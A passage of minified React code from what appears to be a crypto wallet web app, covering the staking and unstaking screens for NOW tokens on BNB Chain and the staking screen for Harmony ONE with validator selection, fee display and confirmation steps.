              , {fromWallet: o, setFromWallet: c, amount: u, setAmount: d} = oG({
                ticker: "now"
            })
              , {convertToFiat: m} = useConverter()
              , p = use_use_wallets_from()
              , f = o ? o.balance : "0"
              , [E] = use_fee(o, o, u, {
                totalBalance: o ? o.balance : void 0,
                typeOperation: "tokensFreeze"
            })
              , [h] = fee_wallet(o);
            (0,
            O.useEffect)(( () => {
                async function fetchMaxAmount() {
                    const e = n((null == o ? void 0 : o.uuid) || "")
                      , t = await (null == e ? void 0 : e.getAccountRawData())
                      , a = null == t ? void 0 : t.find((e => "NOW-E68" === e.symbol));
                    i((null == a ? void 0 : a.frozen) || "0")
                }
                o ? fetchMaxAmount() : i("0")
            }
            ), [o, null == o ? void 0 : o.balance, n]);
            const handleChangeFromWallet = t => {
                e(updateWalletsBalanceAndTxs(t, {
                    isCascade: !1
                }));
                c(t)
            }
            ;
            function handleChangeAmount(e) {
                let {target: {value: t}} = e;
                const a = (0,
                Ko.y4)(t);
                d(a)
            }
            (0,
            O.useEffect)(( () => {
                r && l(!1)
            }
            ), [o]);
            const handleNext = () => {
                const {isValid: e} = t.current.validate();
                if (!e) {
                    l(!0);
                    return
                }
                const n = {
                    walletFrom: null == o ? void 0 : o.uuid,
                    amount: (0,
                    Ko.y4)(u)
                }
                  , r = (0,
                Ko.FH)(m(u, o, "usd"), {
                    max: 4
                });
                r && "NaN" !== r && Object.assign(n, {
                    amountInUsd: r
                });
                a.push({
                    pathname: (0,
                    M.RU)("/staking-bnb/staking/confirm"),
                    search: objectToString(n)
                })
            }
              , g = Math.max(10 - parseFloat(s), 0)
              , y = {
                precision: 8,
                min: g,
                max: (0,
                Ko.FH)(f, {
                    max: 8
                }),
                available: f
            }
              , v = O.memo(( () => O.createElement(panel_right_image, {
                src: mD
            }, "Earn up to 25% per annum at a progressive rate by freezing NOW tokens (from 10 to 100,000 tokens). Rewards are distributed automatically on a weekly basis")));
            return O.createElement(sG, {
                wallet: o,
                styles: BG,
                RightBlockContent: v
            }, O.createElement(sf(), {
                ref: t
            }, O.createElement(label, null, "From"), O.createElement(lf.ValidatorField, {
                rules: zf.wallet,
                value: o
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && r,
                    message: a
                }, O.createElement(Mh, {
                    selectedWallet: o,
                    wallets: p,
                    onChange: handleChangeFromWallet,
                    withoutWatchOnly: !0,
                    customFilter: e => onCustomFilterWallets(e, ["now-e68"]),
                    stakingCurrency: "NOW token"
                }))
            }
            )), O.createElement(label, null, "Amount"), O.createElement("div", {
                className: "relative"
            }, O.createElement(lf.ValidatorField, {
                value: (0,
                Ko.y4)(u),
                rules: zf.amount(y)
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && r,
                    message: a
                }, O.createElement(Ea, {
                    autoFocus: !0,
                    name: "lastpass-fix-search",
                    onChange: handleChangeAmount,
                    value: u,
                    placeholder: "0"
                }))
            }
            ))), O.createElement(AvailableForStaking, {
                currency: (null == o ? void 0 : o.currency) || "bnb",
                maxAmount: f,
                setAmount: d
            }), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Min Staking Amount:"), O.createElement(MiskInfoValue, null, g, " NOW")), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Network Fee:"), O.createElement(MiskInfoValue, {
                disabled: null == E
            }, (0,
            Ko.yF)(E), " ", (0,
            be.xG)(null == h ? void 0 : h.currency))), O.createElement("div", {
                className: BG.footerBlock
            }, O.createElement("div", {
                className: BG.stepInfo
            }, "Step 1 of 3"), O.createElement(Yl, {
                onClick: handleNext,
                color: "blue",
                size: "big"
            }, "Next"))))
        }
          , OG = BoardBnbStakingPage;
        let DG = !1;
        const StakingBnbStakingConfirm = () => {
            const e = useLocationSearch()
              , t = (0,
            j.k6)()
              , a = (0,
            j.TH)()
              , n = (0,
            $.I0)()
              , r = (0,
            $.v9)($c)
              , l = (0,
            $.v9)(eu)
              , [s,i] = (0,
            O.useState)(!1)
              , [o,c] = (0,
            O.useState)(void 0)
              , [u,d] = (0,
            O.useState)(null)
              , {convertToFiat: m} = useConverter()
              , [p,f] = (0,
            O.useState)()
              , {localCurrency: E} = local_currency_useLocalCurrency();
            (0,
            O.useEffect)(( () => {
                r.length && f(l(e.walletFrom) || void 0)
            }
            ), [e.walletFrom, l, r]);
            const [h] = fee_wallet(p)
              , [g,y,v,_] = use_fee(p, p, e.amount, {
                totalBalance: p ? null == p ? void 0 : p.balance : void 0,
                typeOperation: "tokensFreeze"
            })
              , setProcess = async e => {
                c(e);
                return new Promise((e => setTimeout(e, 200)))
            }
            ;
            (0,
            O.useEffect)(( () => {
                p && n(updateWalletsBalanceAndTxs(p, {
                    isCascade: !0
                }))
            }
            ), [n, p]);
            (0,
            O.useEffect)(( () => {
                setProcess(v ? "Loading Fee..." : void 0)
            }
            ), [v]);
            (0,
            O.useEffect)(( () => {
                if (u) {
                    DG = !1;
                    setProcess(void 0);
                    i(!1)
                }
            }
            ), [u]);
            (0,
            O.useEffect)(( () => {
                o && !s && i(!0);
                if (!o) {
                    DG = !1;
                    i(!1)
                }
            }
            ), [s, o]);
            const handleBack = () => {
                t.replace({
                    pathname: (0,
                    M.RU)("/staking-bnb/staking"),
                    search: a.search
                })
            }
            ;
            if (!p || !h)
                return null;
            const w = p.hw || h.hw
              , b = m(e.amount, p)
              , k = m(g || void 0, h)
              , S = (0,
            Ko.h9)(e.amount, g)
              , getApi = async () => {
                const e = undefined;
                return w ? await Fp.Z.getApiByWallet(p) : await Se.Z.getApiByWallet(p)
            }
              , handleConfirm = async () => {
                if (DG)
                    return;
                const a = cc.$.txPerformanceStart();
                DG = !0;
                d(null);
                if ((0,
                Ko.G)(S, 0))
                    return;
                await setProcess("Updating wallet balance...");
                await n(updateWalletsBalanceAndTxs(p, {
                    isCascade: !0
                }));
                await setProcess(`Loading ${(0,
                be.xG)(p.currency)} Blockchain adapter...`);
                await setProcess("Preparing transaction...");
                const r = tM.prepareTxDataParams(p, p, {
                    amount: e.amount,
                    amountInUsd: e.amountInUsd,
                    isFeeIncluded: !0,
                    fee: g
                })
                  , l = await getApi();
                await new Promise((e => {
                    setTimeout(e, 3e3)
                }
                ));
                const s = {
                    addressFrom: r.addressFrom,
                    amount: r.amount,
                    amountInUsd: e.amountInUsd,
                    fee: r.fee,
                    currency: "now"
                };
                try {
                    const n = await l.freezeTransaction(r);
                    if (n.error) {
                        d(n.error);
                        ge.b.error(ge.d.FAILED_STAKE, {
                            currency: "now"
                        }, n.error, s);
                        return
                    }
                    if (n.hash) {
                        cc.$.send(cc.d.STAKING_SEND, "now");
                        const r = cc.$.txPerformanceEnd(a);
                        cc.$.send(cc.d.PERFORMANCE_TX_STAKE, "now", `${r} ms`);
                        ge.b.success(ge.d.STAKE_SUCCESS, {
                            currency: "now"
                        }, "false", s);
                        t.replace({
                            pathname: (0,
                            M.RU)("/send/success"),
                            search: objectToString({
                                type: "bnbTokensFreeze",
                                amount: e.amount,
                                hash: n.hash,
                                walletFrom: p.uuid,
                                currency: p.currency
                            })
                        })
                    }
                } catch (e) {
                    d("Failed Stake");
                    ge.b.error(ge.d.FAILED_STAKE, {
                        currency: "now"
                    }, e, s)
                }
            }
            ;
            return O.createElement("div", {
                className: sM
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: rM
            }, "Please check details and confirm")), O.createElement("div", {
                className: iM
            }, O.createElement("div", {
                className: uM
            }, O.createElement("h3", null, "Are you sure you want to"), O.createElement("h2", null, "Stake ", (0,
            Ko.yF)(e.amount), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(p.currency)), "?")), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "You will stake", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, (0,
            Ko.yF)(e.amount), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(p.currency)), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: b,
                renderCurrency: !0
            })))), p && e.walletFrom && O.createElement(ConfirmInfoWallet, {
                type: "from",
                wallet: p
            }), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Network Fee", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, !g || v ? "–" : O.createElement("span", null, g, " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(h.currency))), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: k
            }), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(e.toConvert || E))))), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Will be staking"), O.createElement(ConfirmInfoValue, null, e.amount, " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(p.currency)))), O.createElement("div", {
                className: dM
            }), O.createElement(ledger_token_info, {
                parentWallet: h
            }), s && w && O.createElement(ui_message, null, "Please unlock you ", p.hw, ", choose ", (0,
            be.xG)(p.family), " app and then press Confirm."), y && O.createElement(ui_message, {
                type: "error"
            }, "Error calculating fee, please", " ", O.createElement("a", {
                className: vM,
                onClick: _
            }, "try again")), (0,
            Ko.lt)(h.balance, g) && O.createElement(nM, {
                wallet: h
            }), u && O.createElement(bf, {
                error: u
            }), O.createElement("div", {
                className: fM
            }, s && O.createElement("div", {
                className: yM
            }, o && O.createElement("span", null, o)), !s && O.createElement("div", {
                className: EM
            }, "Step 2 of 3"), O.createElement("div", {
                className: hM
            }, !s && O.createElement("span", {
                onClick: handleBack
            }, "Back"), O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: handleConfirm,
                isLoading: s
            }, "Confirm")))), O.createElement("input", {
                id: "stakingAmountInUsd",
                type: "hidden",
                name: "amountInUsd",
                value: e.amountInUsd
            }))
        }
          , MG = StakingBnbStakingConfirm
          , UG = "unstaking_wrapper_1Q18Y app_wrapperBlock_2EpA3"
          , GG = "unstaking_wrapperForm_1vTVh app_wrapperLeftBlock_3QLZp"
          , VG = "unstaking_footerBlock_2_Z2E app_footerBlock_n86Kc"
          , KG = "unstaking_stepInfo_2Mxuc app_stepInfo_2VLE6"
          , HG = "unstaking_toggleAdvancedOptions_1lwx1"
          , StakingBnbUnstakingIndex = () => {
            const e = (0,
            $.I0)()
              , t = O.createRef()
              , a = (0,
            j.k6)()
              , [n,r] = (0,
            O.useState)(!1)
              , l = (0,
            $.v9)(lu)
              , [s,i] = (0,
            O.useState)("")
              , {fromWallet: o, setFromWallet: c, amount: u, setAmount: d} = oG({
                ticker: "now"
            });
            (0,
            O.useEffect)(( () => {
                async function fetchMaxAmount() {
                    const e = l((null == o ? void 0 : o.uuid) || "")
                      , t = await (null == e ? void 0 : e.getAccountRawData())
                      , a = null == t ? void 0 : t.find((e => "NOW-E68" === e.symbol));
                    i((null == a ? void 0 : a.frozen) || "0")
                }
                o ? fetchMaxAmount() : i("0")
            }
            ), [o, null == o ? void 0 : o.balance, l]);
            const m = use_use_wallets_from()
              , handleChangeFromWallet = t => {
                if (t) {
                    e(updateWalletsBalanceAndTxs(t, {
                        isCascade: !0
                    }));
                    c(t)
                }
            }
            ;
            function handleChangeAmount(e) {
                let {target: {value: t}} = e;
                r(!1);
                const a = (0,
                Ko.y4)(t);
                d(a)
            }
            (0,
            O.useEffect)(( () => {
                n && r(!1)
            }
            ), [o]);
            const handleNext = () => {
                const {isValid: e} = t.current.validate();
                e ? a.push({
                    pathname: (0,
                    M.RU)("/staking-bnb/unstaking/confirm"),
                    search: objectToString({
                        walletFrom: null == o ? void 0 : o.uuid,
                        amount: (0,
                        Ko.y4)(u)
                    })
                }) : r(!0)
            }
              , p = {
                precision: 8,
                min: "0",
                max: (0,
                Ko.FH)(s, {
                    max: 8
                }),
                available: s
            };
            return O.createElement("div", {
                className: UG
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: mD
            }, "Please note that if you leave some of your funds frozen, the progressive scale of charges will be reset. You need at least 10 frozen tokens to continue receiving the reward.")), O.createElement("div", {
                className: GG
            }, O.createElement(sf(), {
                ref: t
            }, O.createElement(label, null, "From"), O.createElement(lf.ValidatorField, {
                rules: zf.wallet,
                value: o
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && n,
                    message: a
                }, O.createElement(Mh, {
                    selectedWallet: o,
                    wallets: m,
                    onChange: handleChangeFromWallet,
                    withoutWatchOnly: !0,
                    customFilter: e => onCustomFilterWallets(e, ["now-e68"]),
                    stakingCurrency: "NOW token"
                }))
            }
            )), O.createElement(label, null, "Unstake Amount"), O.createElement("div", {
                className: "relative"
            }, O.createElement(lf.ValidatorField, {
                value: (0,
                Ko.y4)(u),
                rules: [...zf.amount(p), ...zf.nowUnstakingAmount(p)]
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && n,
                    message: a
                }, O.createElement(Ea, {
                    autoFocus: !0,
                    name: "lastpass-fix-search",
                    onChange: handleChangeAmount,
                    value: u,
                    placeholder: "0"
                }))
            }
            ))), s && o && O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Available:"), O.createElement(MiskInfoValue, {
                onClick: () => d((0,
                Ko.yF)(s))
            }, (0,
            Ko.yF)(s), " ", (0,
            be.xG)(null == o ? void 0 : o.currency))), O.createElement("div", {
                className: VG
            }, O.createElement("div", {
                className: KG
            }, "Step 1 of 3"), O.createElement(Yl, {
                onClick: handleNext,
                color: "blue",
                size: "big"
            }, "Next")))))
        }
          , zG = StakingBnbUnstakingIndex;
        let jG = !1;
        const StakingBnbUNstakingConfirm = () => {
            const e = useLocationSearch()
              , t = (0,
            j.k6)()
              , a = (0,
            j.TH)()
              , n = (0,
            $.I0)()
              , r = (0,
            $.v9)($c)
              , l = (0,
            $.v9)(eu)
              , [s,i] = (0,
            O.useState)(!1)
              , [o,c] = (0,
            O.useState)(void 0)
              , [u,d] = (0,
            O.useState)(null)
              , {convertToFiat: m} = useConverter()
              , [p,f] = (0,
            O.useState)()
              , {localCurrency: E} = local_currency_useLocalCurrency();
            (0,
            O.useEffect)(( () => {
                r.length && f(l(e.walletFrom) || void 0)
            }
            ), [e.walletFrom, l, r]);
            const [h] = fee_wallet(p)
              , [g,y,v,_] = use_fee(p, p, e.amount, {
                totalBalance: p ? p.balance : void 0,
                typeOperation: "tokensFreeze"
            })
              , setProcess = async e => {
                c(e);
                return new Promise((e => setTimeout(e, 200)))
            }
            ;
            (0,
            O.useEffect)(( () => {
                p && n(updateWalletsBalanceAndTxs(p, {
                    isCascade: !0
                }))
            }
            ), [n, p]);
            (0,
            O.useEffect)(( () => {
                setProcess(v ? "Loading Fee..." : void 0)
            }
            ), [v]);
            (0,
            O.useEffect)(( () => {
                if (u) {
                    jG = !1;
                    setProcess(void 0);
                    i(!1)
                }
            }
            ), [u]);
            (0,
            O.useEffect)(( () => {
                o && !s && i(!0);
                if (!o) {
                    jG = !1;
                    i(!1)
                }
            }
            ), [s, o]);
            const handleBack = () => {
                t.replace({
                    pathname: (0,
                    M.RU)("/staking-bnb/unstaking"),
                    search: a.search
                })
            }
            ;
            if (!p || !h)
                return null;
            const w = p.hw || h.hw
              , b = m(e.amount, p)
              , k = m(e.amount, p, "usd")
              , S = m(g || void 0, h)
              , C = (0,
            Ko.h9)(e.amount, g)
              , getApi = async () => {
                const e = undefined;
                return w ? await Fp.Z.getApiByWallet(p) : await Se.Z.getApiByWallet(p)
            }
              , handleConfirm = async () => {
                if (jG)
                    return;
                const a = cc.$.txPerformanceStart();
                jG = !0;
                d(null);
                if ((0,
                Ko.G)(C, 0))
                    return;
                await setProcess("Updating wallet balance...");
                await n(updateWalletsBalanceAndTxs(p, {
                    isCascade: !0
                }));
                await setProcess(`Loading ${(0,
                be.xG)(p.currency)} Blockchain adapter...`);
                await setProcess("Preparing transaction...");
                const r = tM.prepareTxDataParams(p, p, {
                    amount: e.amount,
                    isFeeIncluded: !0,
                    fee: g
                })
                  , l = await getApi();
                await new Promise((e => {
                    setTimeout(e, 3e3)
                }
                ));
                const s = {
                    addressTo: r.addressFrom,
                    amount: r.amount,
                    amountInUsd: k,
                    fee: r.fee
                };
                try {
                    const n = await l.unfreezeTransaction(r);
                    if (n.error) {
                        d(n.error);
                        ge.b.error(ge.d.FAILED_UNSTAKE, {
                            currency: "now"
                        }, n.error, s);
                        return
                    }
                    if (n.hash) {
                        cc.$.send(cc.d.UNSTAKING_SEND, "now");
                        const r = cc.$.txPerformanceEnd(a);
                        cc.$.send(cc.d.PERFORMANCE_TX_UNSTAKE, "now", `${r} ms`);
                        ge.b.success(ge.d.UNSTAKE_SUCCESS, {
                            currency: "now"
                        }, "false", s);
                        t.replace({
                            pathname: (0,
                            M.RU)("/send/success"),
                            search: objectToString({
                                type: "bnbTokensUnfreeze",
                                amount: e.amount,
                                hash: n.hash,
                                walletFrom: p.uuid,
                                currency: p.currency
                            })
                        })
                    }
                } catch (e) {
                    d("Failed unstake");
                    ge.b.error(ge.d.FAILED_UNSTAKE, {
                        currency: "now"
                    }, e, s)
                }
            }
            ;
            return O.createElement("div", {
                className: sM
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: rM
            }, "Please check details and confirm")), O.createElement("div", {
                className: iM
            }, O.createElement("div", {
                className: uM
            }, O.createElement("h3", null, "Are you sure you want to"), O.createElement("h2", null, "Unstake ", (0,
            Ko.yF)(e.amount), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(p.currency)), "?")), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "You will stake", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, (0,
            Ko.yF)(e.amount), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(p.currency)), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: b,
                renderCurrency: !0
            })))), p && e.walletFrom && O.createElement(ConfirmInfoWallet, {
                type: "from",
                wallet: p
            }), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Network Fee", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, !g || v ? "–" : O.createElement("span", null, g, " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(h.currency))), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: S
            }), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(e.toConvert || E))))), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Will be staking"), O.createElement(ConfirmInfoValue, null, e.amount, " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(p.currency)))), O.createElement("div", {
                className: dM
            }), O.createElement(ledger_token_info, {
                parentWallet: h
            }), s && w && O.createElement(ui_message, null, "Please unlock you ", p.hw, ", choose ", (0,
            be.xG)(p.family), " app and then press Confirm."), y && O.createElement(ui_message, {
                type: "error"
            }, "Error calculating fee, please", " ", O.createElement("a", {
                className: vM,
                onClick: _
            }, "try again")), (0,
            Ko.lt)(h.balance, g) && O.createElement(nM, {
                wallet: h
            }), u && O.createElement(bf, {
                error: u
            }), O.createElement("div", {
                className: fM
            }, s && O.createElement("div", {
                className: yM
            }, o && O.createElement("span", null, o)), !s && O.createElement("div", {
                className: EM
            }, "Step 2 of 3"), O.createElement("div", {
                className: hM
            }, !s && O.createElement("span", {
                onClick: handleBack
            }, "Back"), O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: handleConfirm,
                isLoading: s
            }, "Confirm")))))
        }
          , $G = StakingBnbUNstakingConfirm
          , ZG = {
            wrapper: "index_wrapper_1Bkmj app_wrapperBlock_2EpA3",
            wrapperForm: "index_wrapperForm_19qxc app_wrapperLeftBlock_3QLZp",
            footerBlock: "index_footerBlock_3gThu app_footerBlock_n86Kc",
            stepInfo: "index_stepInfo_2gWOC app_stepInfo_2VLE6",
            toggleAdvancedOptions: "index_toggleAdvancedOptions_QAVCG",
            toggleAdvancedOptionsText: "index_toggleAdvancedOptionsText_1FpFN"
        }
          , YG = "0.002"
          , StakingOneIndex = () => {
            const e = (0,
            $.I0)()
              , t = O.createRef()
              , a = (0,
            j.k6)()
              , {convertToFiat: n} = useConverter()
              , {defaultValidator: r, listOfValidators: l, isLoading: s} = tI()
              , {fromWallet: i, setFromWallet: o, amount: c, setAmount: u, unlockingAmount: d} = oG({
                ticker: "one"
            })
              , m = (0,
            $.v9)($c)
              , p = (0,
            $.v9)(ax)
              , f = (0,
            $.v9)(ox)
              , [E,h] = (0,
            O.useState)(!1)
              , [g,y] = (0,
            O.useState)(!1)
              , [v,_] = (0,
            O.useState)(void 0)
              , [w,b] = (0,
            O.useState)(d)
              , k = (0,
            O.useMemo)(( () => (!p || "STAKING_INFO_SUCCESS" !== p.fetchStatus) && l && l.length > 0), [p, l])
              , S = [...m].filter((e => "one" === e.currency))
              , C = (0,
            Ko.$q)(YG, 3).toString()
              , N = i && (0,
            Ko.h9)(i.balance, C).toString()
              , T = (0,
            Ko.gt)(N, "0") ? N : "0"
              , A = w ? (0,
            Ko.PD)(T, w).toString() : (0,
            Ko.gt)(N, "0") ? N : "0"
              , x = 18
              , I = (0,
            Ko.FH)(A, {
                roundDown: !0,
                max: x
            })
              , handleChangeFromWallet = t => {
                e(updateWalletsBalanceAndTxs(t, {
                    isCascade: !0
                }));
                o(t)
            }
            ;
            function handleSetValidator(e) {
                _(e)
            }
            const handleNext = () => {
                var e, r;
                const {isValid: l} = null == t || null === (e = t.current) || void 0 === e ? void 0 : e.validate();
                if (!l || !i || !v) {
                    y(!0);
                    return
                }
                const s = w && I ? (0,
                Ko.PD)(I, YG).toString() : ""
                  , o = {
                    amount: c,
                    walletFrom: (null == i ? void 0 : i.uuid) || "",
                    validatorAddress: (null == v ? void 0 : v.address) || "",
                    validatorRate: (null == v || null === (r = v.subtitle) || void 0 === r ? void 0 : r.replace("Annual yield: ", "")) || "",
                    validatorTitle: (null == v ? void 0 : v.title) || "",
                    maxAmount: s
                }
                  , u = (0,
                Ko.FH)(n(c, i, "usd"), {
                    max: 4
                });
                u && Object.assign(o, {
                    amountInUsd: u
                });
                const d = new URLSearchParams(o);
                a.push({
                    pathname: (0,
                    M.RU)("/staking-one/staking/confirm"),
                    search: d.toString()
                })
            }
            ;
            function handleAmount(e) {
                let {target: {value: t}} = e;
                const a = (0,
                Ko.y4)(t);
                u(a)
            }
            const handleSetVisibleOptions = () => {
                h(!E)
            }
              , P = {
                precision: x,
                min: "100",
                max: I,
                available: I
            };
            (0,
            O.useEffect)((function setDefaultValidatorAfterFetch() {
                if (0 !== l.length) {
                    h(!1);
                    _(l[0])
                }
            }
            ), [r, null == i ? void 0 : i.uuid]);
            (0,
            O.useEffect)((function resetVisibleErrors() {
                g && y(!1)
            }
            ), [i]);
            (0,
            O.useEffect)((function fetchStakingInfo() {
                !w && k && i && e(lb.fetchActiveStakingInfoByWallet({
                    wallet: i,
                    validators: l
                }))
            }
            ), [e, w, i, k, l]);
            (0,
            O.useEffect)((function fetchCurrentEpoch() {
                w || f || !i || e(lb.fetchCurrentEpoch({
                    wallet: i
                }))
            }
            ), [e, w, f, i]);
            (0,
            O.useEffect)((function calculateUnlockingAmount() {
                !w && p && "STAKING_INFO_SUCCESS" === p.fetchStatus && f && p.dto && "row"in p.dto && p.dto.raw.forEach((e => {
                    const {Undelegations: t} = e;
                    if (!Array.isArray(t) || !t.length)
                        return;
                    const a = t.reduce(( (e, t) => {
                        (0,
                        Ko.eg)((0,
                        Ko.h9)(f, null == t ? void 0 : t.Epoch), 1) && (e = (0,
                        Ko.PD)(e, t.Amount).toString());
                        return e.toString()
                    }
                    ), "0");
                    (0,
                    Ko.gt)(a, 0) && b((e => e ? (0,
                    Ko.PD)(e, a).toString() : a))
                }
                ), [])
            }
            ), [p, w, f]);
            (0,
            O.useEffect)((function clearStore() {
                return () => {
                    e(lb.setClearStore())
                }
            }
            ), []);
            const L = O.memo(( () => O.createElement(panel_right_image, {
                src: mD
            }, "Delegate ONE to validators and earn staking rewards. Please note, it takes up to 6 days (7 epochs) to unstake your funds.")));
            return i ? O.createElement(sG, {
                wallet: i,
                styles: ZG,
                RightBlockContent: L
            }, O.createElement(sf(), {
                ref: t
            }, O.createElement(label, null, "From"), O.createElement(lf.ValidatorField, {
                rules: zf.wallet,
                value: i
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && g,
                    message: a
                }, O.createElement(Mh, {
                    selectedWallet: i,
                    wallets: S,
                    onChange: handleChangeFromWallet,
                    withoutWatchOnly: !0,
                    customFilter: e => onCustomFilterWallets(e, ["one"]),
                    stakingCurrency: "ONE"
                }))
            }
            )), O.createElement(label, null, "Deposit Amount"), O.createElement("div", {
                className: "relative"
            }, O.createElement(lf.ValidatorField, {
                value: c,
                rules: zf.amount(P)
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && g,
                    message: a
                }, O.createElement(Ea, {
                    onChange: handleAmount,
                    value: c,
                    placeholder: "0"
                }))
            }
            ))), O.createElement(AvailableForStaking, {
                currency: i.currency,
                maxAmount: I,
                setAmount: u
            }), !!w && T && O.createElement(ui_message, {
                type: "info"
            }, "Available amount includes ", T, " ONE (your balance) and ", w, " ONE (locked after the unstaking). The current operation first redelegates the locked funds."), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Min Deposit Amount:"), O.createElement(MiskInfoValue, null, "100 ONE")), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Validator:"), O.createElement(MiskInfoValue, null, s ? O.createElement(LoaderDots, {
                visible: !0
            }) : O.createElement(O.Fragment, null, null == v ? void 0 : v.title, " (", null == v ? void 0 : v.subtitle, ")"))), !E && O.createElement("div", {
                className: ZG.toggleAdvancedOptions
            }, O.createElement("span", {
                onClick: handleSetVisibleOptions,
                className: "dashedNormal"
            }, "Advanced options")), E && O.createElement(O.Fragment, null, O.createElement("div", {
                className: ZG.toggleAdvancedOptions
            }, O.createElement("span", {
                onClick: handleSetVisibleOptions,
                className: "dashedNormal"
            }, "Hide advanced options")), O.createElement(label, null, "Validator"), O.createElement(lf.ValidatorField, {
                rules: zf.xtzValidator,
                value: v
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && g,
                    message: a
                }, O.createElement(Lp, {
                    selected: v,
                    isLoading: s,
                    items: l,
                    placeholder: "Select Validator",
                    emptyPlaceholder: "Validators not found",
                    onChange: handleSetValidator
                }))
            }
            )), O.createElement(ui_message, {
                type: "warning"
            }, "We cannot guarantee the stability of a third-party validator. Please do your own research to assess risks.")), O.createElement("div", {
                className: ZG.footerBlock
            }, O.createElement("div", {
                className: ZG.stepInfo
            }, "Step 1 of 3"), O.createElement(Yl, {
                onClick: handleNext,
                color: "blue",
                size: "big"
            }, "Next")))) : null
        }
          , qG = StakingOneIndex
          , XG = {
            isStakingTx: !0
        }
          , OneStakeConfirm = () => O.createElement(StakeConfirm_StakeConfirm, {
            customAdditionalSend: XG,
            isMaxNetworkFee: !0
        })
          , QG = "unstake-confirm_wrapper_1_MYp app_wrapperBlock_2EpA3"
          , JG = "unstake-confirm_wrapperForm_3VjxI app_wrapperLeftBlock_3QLZp"
          , eV = "unstake-confirm_lock_29O8d"
          , tV = "unstake-confirm_wrapperCenterForm_2waiV app_wrapperCenterBlock_bcslh"
          , aV = "unstake-confirm_headerTitles_lZdW3"
          , nV = "unstake-confirm_separator_2A11E"
          , rV = "unstake-confirm_isConfirmError_1lD-I"
          , lV = "unstake-confirm_flickerAnimation_S65am"
          , sV = "unstake-confirm_footerBlock_72sWT"
          , iV = "unstake-confirm_stepInfo_2pMJo"
          , oV = "unstake-confirm_buttonsWrapper_Ka_1e"
          , cV = "unstake-confirm_feeInfoToggle_uzUtu"
          , uV = "unstake-confirm_loaderWrapper_OchQg"
          , dV = "unstake-confirm_updateBalanceLink_16uU-"
          , mV = "unstake-confirm_errorParams_uYGE6"
          , pV = "unstake-confirm_topUpWalletLink_3M2a3"
          , fV = "unstake-confirm_userSelect_2rtX7"
          , EV = "unstake-confirm_tokenInfoBlock_1l0IQ"
          , hV = "unstake-confirm_tokenInfoBlockItem_3V_kb"
          , UnstakeConfirm_UnstakeConfirm = e => {
            let {customCondition: t, customAdditionalSend: a, isMaxNetworkFee: n, rightBlockText: r=uG} = e;
            const {amount: l, walletFrom: s, validatorAddress: i, validatorRate: o, validatorTitle: c} = useLocationSearch()
              , u = (0,
            j.k6)()
              , d = (0,
            $.I0)()
              , m = (0,
            $.v9)(nx)
              , p = (0,
            $.v9)(rx)
              , f = (0,
            $.v9)(sx)
              , E = (0,
            $.v9)(ix)
              , h = (0,
            O.useMemo)(( () => Boolean(m || E)), [m, E])
              , {fromWallet: g, toWallet: y, feeWallet: v} = useWalletsForStakingTx({
                walletIdFromParams: s,
                validatorAddress: i
            })
              , _ = (0,
            O.useMemo)(( () => ({
                totalBalance: g ? g.balance : void 0,
                ...a
            })), [a, g])
              , [w,b,k,S,,C] = use_fee(g, y, l, _)
              , {hardWalletType: N, isHardWallet: T, isFeeWalletOng: A, isInsufficientBalance: x} = useBooleanRules({
                fee: w,
                feeWallet: v,
                fromWallet: g,
                amount: l,
                feeResource: C
            })
